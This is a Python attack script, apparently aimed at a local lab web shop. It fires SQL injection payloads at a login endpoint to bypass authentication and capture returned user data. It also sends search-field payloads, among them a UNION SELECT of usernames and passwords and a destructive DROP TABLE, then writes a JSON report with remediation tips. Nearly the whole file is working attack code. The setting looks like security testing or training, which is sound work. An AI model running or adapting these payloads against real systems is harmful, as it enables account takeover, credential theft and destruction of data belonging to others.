import requests
import json
import time
import logging
import os
from datetime import datetime
from urllib.parse import quote

class SQLInjectionAttacker:
    def __init__(self, target_url="http://localhost:3000"):
        self.target_url = target_url
        self.session = requests.Session()
        self.results = []
        
        # Ensure required directories exist
        os.makedirs('../logs/security', exist_ok=True)
        os.makedirs('../reports', exist_ok=True)
        
        # Set up logging with UTF-8 file support
        log_file = '../logs/security/sql_injection.log'
        file_handler = logging.FileHandler(log_file, encoding='utf-8')
        stream_handler = logging.StreamHandler()
        
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - SQLI - %(levelname)s - %(message)s',
            handlers=[file_handler, stream_handler]
        )
        self.logger = logging.getLogger(__name__)

    def safe_log(self, level, message_with_emoji, plain_message=None):
        """Log emoji message to file, plain message to console to avoid cp1252 errors"""
        if plain_message is None:
            # Strip common emojis for console
            plain_message = (
                message_with_emoji
                .replace("🚀", "")
                .replace("🔓", "")
                .replace("🚨", "")
                .replace("🔍", "")
                .replace("⚠️", "")
                .replace("📄", "")
                .strip()
            )
        # Log full message (with emoji) to file
        getattr(self.logger, level)(message_with_emoji)
        # Print plain version to console
        level_upper = level.upper()
        print(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - SQLI - {level_upper} - {plain_message}")

    def test_login_bypass(self):
        """Test SQL injection for login bypass"""
        self.safe_log('info', "🔓 Testing SQL Injection - Login Bypass")

        payloads = [
            {"email": "' OR '1'='1'--", "password": "anything"},
            {"email": "' OR 1=1--", "password": "test"},
            {"email": "admin'--", "password": ""},
            {"email": "' OR 'a'='a", "password": "anything"},
            {"email": "admin'/*", "password": "test"}
        ]

        for i, payload in enumerate(payloads, 1):
            try:
                self.safe_log('info', f"Testing payload {i}: {payload['email']}")
                
                response = self.session.post(
                    f"{self.target_url}/rest/user/login",
                    json=payload,
                    headers={'Content-Type': 'application/json'},
                    timeout=10
                )

                result = {
                    'payload_id': i,
                    'payload': payload['email'],
                    'status_code': response.status_code,
                    'success': response.status_code == 200,
                    'timestamp': datetime.now().isoformat()
                }

                if response.status_code == 200:
                    result['user_data'] = response.json()
                    self.safe_log('critical', f"🚨 SUCCESSFUL LOGIN BYPASS with: {payload['email']}")
                
                self.results.append(result)
                time.sleep(1)

            except Exception as e:
                self.safe_log('error', f"Error with payload {i}: {e}")
                self.results.append({
                    'payload_id': i,
                    'payload': payload['email'],
                    'error': str(e),
                    'success': False
                })

    def test_search_injection(self):
        """Test SQL injection in search functionality"""
        self.safe_log('info', "🔍 Testing SQL Injection - Search Function")

        search_payloads = [
            "' UNION SELECT username, password FROM Users--",
            "' AND 1=1--",
            "'; DROP TABLE Products--",
            "' OR EXISTS(SELECT * FROM Users)--"
        ]

        for payload in search_payloads:
            try:
                encoded_payload = quote(payload)
                url = f"{self.target_url}/rest/products/search?q={encoded_payload}"

                response = self.session.get(url, timeout=10)

                result = {
                    'type': 'search_injection',
                    'payload': payload,
                    'status_code': response.status_code,
                    'response_length': len(response.text),
                    'vulnerable': any(indicator in response.text.lower() 
                                    for indicator in ['error', 'sql', 'syntax']),
                    'timestamp': datetime.now().isoformat()
                }

                if result['vulnerable']:
                    self.safe_log('warning', f"⚠️ Possible SQLi in search: {payload}")

                self.results.append(result)
                time.sleep(0.5)

            except Exception as e:
                self.safe_log('error', f"Search injection error: {e}")

    def generate_report(self):
        """Generate comprehensive SQL injection report"""
        total_tests = len(self.results)
        successful_bypasses = sum(1 for r in self.results if r.get('success'))
        vulnerabilities_found = sum(1 for r in self.results if r.get('vulnerable'))

        report = {
            'attack_type': 'SQL Injection',
            'timestamp': datetime.now().isoformat(),
            'target': self.target_url,
            'summary': {
                'total_payloads_tested': total_tests,
                'successful_login_bypasses': successful_bypasses,
                'vulnerabilities_found': vulnerabilities_found,
                'success_rate': (successful_bypasses / total_tests * 100) if total_tests > 0 else 0
            },
            'detailed_results': self.results,
            'recommendations': [
                "Use parameterized queries or prepared statements",
                "Implement proper input validation",
                "Apply principle of least privilege for database accounts",
                "Use web application firewalls",
                "Regular security testing and code reviews"
            ]
        }

        report_path = '../reports/sql_injection_report.json'
        with open(report_path, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)

        self.safe_log('info', f"📄 SQL Injection report saved: {successful_bypasses} successful bypasses")
        return report

    def run_complete_attack(self):
        """Execute complete SQL injection attack suite"""
        self.safe_log('info', "🚀 Starting Comprehensive SQL Injection Attack")

        self.test_login_bypass()
        self.test_search_injection()

        report = self.generate_report()

        print(f"\n🔓 SQL INJECTION ATTACK SUMMARY")
        print(f"   Successful login bypasses: {report['summary']['successful_login_bypasses']}")
        print(f"   Vulnerabilities found: {report['summary']['vulnerabilities_found']}")
        print(f"   Success rate: {report['summary']['success_rate']:.1f}%")

        return report

if __name__ == "__main__":
    attacker = SQLInjectionAttacker()
    attacker.run_complete_attack()
    